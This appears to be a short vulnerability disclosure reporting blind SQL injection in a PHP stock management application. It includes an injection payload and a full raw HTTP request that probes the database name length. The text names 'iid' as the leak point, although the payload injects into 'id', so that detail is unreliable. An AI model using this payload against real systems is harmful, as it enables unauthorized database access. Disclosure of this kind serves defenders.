# Ingredients Stock Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15364/ingredients-stock-management-system-phpoop-free-source-code.html

Vulnerability File: /isms/admin/stocks/manage_stockin.php

Vulnerability location /isms/admin/stocks/manage_stockin.php, iid

db_name = isms_db;length=7

[+] Payload: /isms/admin/stocks/manage_stockin.php?iid=4&id=4%27%20and%20length(database())%20=%207--+ // Leak place ---> iid

```sql
GET /isms/admin/stocks/manage_stockin.php?iid=4&id=4%27%20and%20length(database())%20=%207--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=2m880botn1u43hd2gu23ttj4ug
Connection: close
```

When length (database ()) = 7
![image](https://user-images.githubusercontent.com/54017627/179384186-31b8f1c1-f417-451c-a034-c65d1b18364d.png)

When length (database ()) = 6
![image](https://user-images.githubusercontent.com/54017627/179384191-856b9326-8fd5-4acf-a153-fa82314904ff.png)
